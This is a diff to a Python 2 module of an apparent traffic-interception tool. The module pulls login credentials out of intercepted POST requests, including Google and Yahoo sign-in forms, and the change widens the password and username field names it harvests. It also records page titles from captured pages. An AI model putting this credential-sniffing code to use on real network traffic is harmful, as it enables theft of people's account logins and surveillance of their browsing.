@@ -5,7 +5,7 @@ import re
 class PostMethod(Catcher):
     def __init__(self):
         super(PostMethod, self).__init__(methods=['POST'])
-    
+
     def get_header(self, req, key):
         if key in req.headers and req.headers[key]:
             return req.headers[key][0]
@@ -55,7 +55,7 @@ class PostMethod(Catcher):
         ct = req.headers['Content-Disposition'][0]
         if not ct.startswith('attachment'):
             return None
-        
+
         filename = None
         m = re.search(r'filename=["]([^"]+)["]', 'attachment; filename="text.txt"')
         if m is not None:
@@ -81,7 +81,7 @@ class PostMethod(Catcher):
                      }
                 print "GOOGLE CRED", fact
                 return fact
-        
+
         elif req.host == "login.yahoo.com":
             if 'passwd' in data.data:
                 fact = {'kind': 'cred',
@@ -99,10 +99,10 @@ class PostMethod(Catcher):
             username = None
             email = None
             for k in data.data:
-                if k.lower() in ['pass', 'passwd', 'password']:
+                if k.lower() in ['pass', 'passwd', 'password', '_pass']:
                     password = data.val(k)
                     continue
-                if k.lower() in ['user','username','login']:
+                if k.lower() in ['user','username','login', "_user"]:
                     username = data.val(k)
                     continue
                 if k.lower() in ['email','mail']:
@@ -121,19 +121,43 @@ class PostMethod(Catcher):
 
 
 class Get(Catcher):
+    title_pattern = re.compile("<title *>([^<]*)</title>", re.MULTILINE | re.I)
+
     def __init__(self):
         super(Get, self).__init__(methods=['GET'])
-    
+
+    def find_title(self, req):
+        if req.code != 200: return ''
+
+        content = req.get_decoded_content()
+        if not content: return ''
+
+        found = self.title_pattern.search(content[0:1000])
+
+        if found:
+
+            title = found.groups()[0]
+            codec = self.get_codec(req)
+            if codec:
+                print "Decoding with %s" % codec
+                try:
+                    title = title.decode(codec)
+                except UnicodeDecodeError:
+                    return None
+            return title
+
+        return None
+
     @catcher
     def save_url_and_query(self, flow):
         if not self.is_content_type(flow.response, 'text/html'):
-            return 
+            return
         gd = GetData(flow.request.path)
         fact = {
             'path': gd.path,
             'query': gd.data,
-            'query_string': gd.query, 
-            'kind': 'get'
+            'query_string': gd.query,
+            'kind': 'get',
+            'title': self.find_title(flow.response)
         }
         self.save(flow, fact)
-        
